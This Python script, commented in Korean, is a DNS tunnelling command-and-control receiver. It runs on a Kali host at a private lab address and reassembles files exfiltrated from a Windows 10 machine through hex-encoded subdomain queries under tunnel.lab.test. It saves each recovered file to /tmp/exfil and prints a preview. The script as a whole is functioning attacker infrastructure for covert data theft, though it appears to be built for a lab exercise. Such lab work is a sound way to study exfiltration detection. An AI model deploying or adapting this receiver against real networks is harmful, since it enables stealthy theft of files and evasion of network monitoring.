#!/usr/bin/env python3
"""
DNS 터널 수신 서버 - Kali C2 (192.168.200.10)
Win10이 보낸 *.tunnel.lab.test 쿼리를 받아 원본 파일 복원

실행: sudo python3 kali_dns_server.py
"""
import socket
import struct
import os
import re
import sys
from datetime import datetime

LISTEN_IP   = "0.0.0.0"
LISTEN_PORT = 53
DOMAIN      = "tunnel.lab.test"
OUTPUT_DIR  = "/tmp/exfil"

os.makedirs(OUTPUT_DIR, exist_ok=True)

# src_ip → {chunks:{seq:hex}, total:int, size:int}
sessions: dict = {}


# ── DNS 파싱 ──────────────────────────────────────────────────
def parse_qname(data: bytes) -> str:
    """DNS 패킷에서 질의 도메인 이름 추출"""
    pos, labels = 12, []
    while pos < len(data) and data[pos] != 0:
        n = data[pos]; pos += 1
        labels.append(data[pos:pos+n].decode("ascii", errors="ignore"))
        pos += n
    return ".".join(labels)


def build_nxdomain(data: bytes) -> bytes:
    """NXDOMAIN 응답 생성 (질문 섹션 그대로 복사)"""
    hdr = bytearray(data[:2])        # TX ID
    hdr += b'\x81\x83'              # QR=1 RD=1 RA=1 RCODE=3(NXDOMAIN)
    hdr += data[4:6]                 # QDCOUNT
    hdr += b'\x00\x00\x00\x00\x00\x00'  # ANCOUNT NSCOUNT ARCOUNT
    hdr += data[12:]                 # 질문 섹션
    return bytes(hdr)


# ── 세션 처리 ─────────────────────────────────────────────────
def process_label(label: str, src_ip: str):
    label = label.lower()

    # start{count:4x}{size:4x}
    m = re.fullmatch(r'start([0-9a-f]{4})([0-9a-f]{4})', label)
    if m:
        total = int(m.group(1), 16)
        size  = int(m.group(2), 16)
        sessions[src_ip] = {"chunks": {}, "total": total, "size": size}
        print(f"\n[+] Session start from {src_ip}: chunks={total}, size={size}B")
        return

    # end{count:4x}
    m = re.fullmatch(r'end([0-9a-f]{4})', label)
    if m:
        print(f"[+] Session end from {src_ip}")
        if src_ip in sessions:
            assemble(src_ip)
        return

    # {seq:4x}{hex_data}
    m = re.fullmatch(r'([0-9a-f]{4})([0-9a-f]+)', label)
    if m:
        seq      = int(m.group(1), 16)
        hex_data = m.group(2)
        if src_ip not in sessions:
            sessions[src_ip] = {"chunks": {}, "total": None, "size": None}
        sessions[src_ip]["chunks"][seq] = hex_data
        print(f"  [{src_ip}] 청크 #{seq:04d} → {len(hex_data)//2}B")


def assemble(src_ip: str):
    """수집된 청크를 원본 파일로 복원"""
    s = sessions.pop(src_ip)
    if not s["chunks"]:
        print("[!] No chunks, cannot assemble")
        return

    max_seq  = max(s["chunks"])
    hex_full = ""
    for i in range(max_seq + 1):
        if i in s["chunks"]:
            hex_full += s["chunks"][i]
        else:
            # Missing chunk, padding 00 (25바이트)
            hex_full += "00" * 25
            print(f"[!] 청크 #{i} Missing → 패딩")

    try:
        raw = bytes.fromhex(hex_full)
    except ValueError as e:
        print(f"[!] Hex decode error: {e}")
        return

    # 선언된 크기로 자르기
    if s["size"]:
        raw = raw[:s["size"]]

    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
    outfile = os.path.join(OUTPUT_DIR, f"exfil_{src_ip.replace('.','_')}_{ts}.bin")
    with open(outfile, "wb") as f:
        f.write(raw)

    print(f"\n{'='*60}")
    print(f"[★] ASSEMBLED: {outfile}  ({len(raw)} bytes)")
    try:
        preview = raw.decode("utf-8", errors="replace")[:2000]
        print(f"[Preview]\n{preview}")
    except Exception:
        print(f"[Preview] (binary)")
    print('='*60 + "\n")


# ── 메인 루프 ─────────────────────────────────────────────────
def main():
    if os.geteuid() != 0:
        print("[!] Run as root (sudo python3 kali_dns_server.py)")
        sys.exit(1)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((LISTEN_IP, LISTEN_PORT))

    print(f"[*] DNS 터널 수신 대기  {LISTEN_IP}:{LISTEN_PORT}")
    print(f"[*] Target domain: *.{DOMAIN}")
    print(f"[*] Output dir: {OUTPUT_DIR}\n")

    while True:
        try:
            data, addr = sock.recvfrom(512)
            src_ip     = addr[0]
            if len(data) < 12:
                continue

            qname = parse_qname(data)

            if not qname.lower().endswith(DOMAIN):
                continue  # 관련 없는 쿼리 무시

            # 서브도메인 레이블만 추출
            label = qname[:-(len(DOMAIN) + 1)]
            print(f"[DNS] {src_ip} → {qname}")

            process_label(label, src_ip)

            # NXDOMAIN 응답 (응답 없으면 Win10 쪽에서 타임아웃 대기)
            sock.sendto(build_nxdomain(data), addr)

        except KeyboardInterrupt:
            print("\n[*] Shutting down.")
            break
        except Exception as e:
            print(f"[!] Error: {e}")


if __name__ == "__main__":
    main()
